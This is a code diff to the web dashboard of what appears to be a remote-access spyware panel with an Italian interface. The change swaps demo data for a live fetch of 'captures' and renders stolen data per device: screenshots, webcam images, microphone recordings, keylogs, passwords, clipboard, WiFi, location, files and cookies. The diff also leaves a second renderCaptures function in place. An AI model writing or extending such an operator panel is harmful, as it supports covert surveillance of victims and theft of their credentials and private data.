@@ -209,31 +209,91 @@
             document.getElementById('sidebar').classList.toggle('open');
             document.getElementById('sidebarOverlay').classList.toggle('active');
         }
-
         function refreshCaptures() {
-            const grid = document.getElementById('captureGrid');
-            grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-spinner fa-spin"></i> Caricamento...</div>`;
+    const grid = document.getElementById('captureGrid');
+    grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);">
+        <i class="fas fa-spinner fa-spin"></i> Caricamento catture...
+    </div>`;
 
-            // Usa l'API per ottenere le captures (dovresti implementare /api/captures)
-            // Per ora mostriamo dati demo
-            const demo = [
-                { id: 1, type: 'screenshot', device_id: 'win-001', data: '', created_at: new Date().toISOString() },
-                { id: 2, type: 'webcam', device_id: 'and-002', data: '', created_at: new Date().toISOString() },
-                { id: 3, type: 'keylog', device_id: 'win-001', data: '{"keys": "Hello world"}', created_at: new Date().toISOString() },
-                { id: 4, type: 'passwords', device_id: 'win-001', data: '{"passwords": [{"url": "google.com", "username": "test"}]}', created_at: new Date().toISOString() },
-                { id: 5, type: 'mic', device_id: 'and-002', data: '', created_at: new Date().toISOString() },
-                { id: 6, type: 'clipboard', device_id: 'win-001', data: 'Contenuto copiato', created_at: new Date().toISOString() },
-            ];
-            capturesData = demo;
-            renderCaptures(demo);
-            document.getElementById('captureBadge').textContent = demo.length;
+    fetch('/api/captures?limit=50')
+        .then(res => res.json())
+        .then(data => {
+            capturesData = data;
+            renderCaptures(data);
+            document.getElementById('captureBadge').textContent = data.length;
+        })
+        .catch(() => {
+            grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);">
+                <i class="fas fa-exclamation-triangle"></i> Nessuna cattura disponibile
+            </div>`;
+        });
+}
 
-            // Chiamata API reale (quando implementata)
-            // fetch('/api/captures')
-            //     .then(res => res.json())
-            //     .then(data => { capturesData = data; renderCaptures(data); })
-            //     .catch(() => {});
+function renderCaptures(captures) {
+    const grid = document.getElementById('captureGrid');
+    const filtered = applyFilters(captures);
+
+    if (!filtered || filtered.length === 0) {
+        grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);">
+            <i class="fas fa-inbox"></i> Nessuna cattura trovata
+        </div>`;
+        return;
+    }
+
+    const typeIcons = {
+        'screenshot': 'fa-desktop', 'webcam': 'fa-camera', 'mic': 'fa-microphone',
+        'keylog': 'fa-keyboard', 'passwords': 'fa-key', 'clipboard': 'fa-clipboard',
+        'wifi': 'fa-wifi', 'location': 'fa-map-pin', 'mouse': 'fa-mouse',
+        'files': 'fa-folder', 'cookies': 'fa-cookie'
+    };
+    const typeLabels = {
+        'screenshot': 'Screenshot', 'webcam': 'Webcam', 'mic': 'Microfono',
+        'keylog': 'Keylog', 'passwords': 'Password', 'clipboard': 'Clipboard',
+        'wifi': 'WiFi', 'location': 'Location', 'mouse': 'Mouse',
+        'files': 'Files', 'cookies': 'Cookies'
+    };
+    const typeColors = {
+        'screenshot': '#8b5cf6', 'webcam': '#22d3ee', 'mic': '#f472b6',
+        'keylog': '#f59e0b', 'passwords': '#ef4444', 'clipboard': '#34d399',
+        'wifi': '#60a5fa', 'location': '#f97316', 'mouse': '#a855f7',
+        'files': '#14b8a6', 'cookies': '#f43f5e'
+    };
+
+    let html = '';
+    filtered.forEach(c => {
+        const icon = typeIcons[c.type] || 'fa-file';
+        const label = typeLabels[c.type] || c.type;
+        const color = typeColors[c.type] || '#666';
+        const time = new Date(c.created_at).toLocaleString();
+        const device = c.device_id ? c.device_id.substring(0,12) + '...' : 'Unknown';
+
+        let previewContent = '';
+        if ((c.type === 'screenshot' || c.type === 'webcam') && c.data) {
+            previewContent = `<img src="data:image/png;base64,${c.data}" alt="${label}" onclick="openPreview('data:image/png;base64,${c.data}')" />`;
+        } else if (c.type === 'mic' && c.data) {
+            previewContent = `<audio controls style="width:100%;max-height:150px;"><source src="data:audio/wav;base64,${c.data}" type="audio/wav"></audio>`;
+        } else if (c.data) {
+            let text = typeof c.data === 'string' ? c.data : JSON.stringify(c.data, null, 2);
+            previewContent = `<div style="padding:0.5rem;font-size:0.7rem;color:rgba(255,255,255,0.3);word-break:break-all;max-height:150px;overflow-y:auto;">${text.substring(0,200)}${text.length>200?'...':''}</div>`;
+        } else {
+            previewContent = `<span class="placeholder"><i class="fas ${icon}" style="font-size:2rem;opacity:0.3;"></i></span>`;
         }
+
+        html += `
+        <div class="capture-item">
+            <div class="preview">${previewContent}</div>
+            <div class="info">
+                <div class="type" style="color:${color};"><i class="fas ${icon}"></i> ${label}</div>
+                <div class="meta">Device: ${device} · ${time}</div>
+                <div class="actions">
+                    <button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;" onclick="viewCapture(${c.id})"><i class="fas fa-info-circle"></i></button>
+                    <button class="btn-ghost" style="padding:0.2rem 0.5rem;font-size:0.6rem;color:#ef4444;" onclick="deleteCapture(${c.id})"><i class="fas fa-trash"></i></button>
+                </div>
+            </div>
+        </div>`;
+    });
+    grid.innerHTML = html;
+}
 
         function renderCaptures(captures) {
             const grid = document.getElementById('captureGrid');
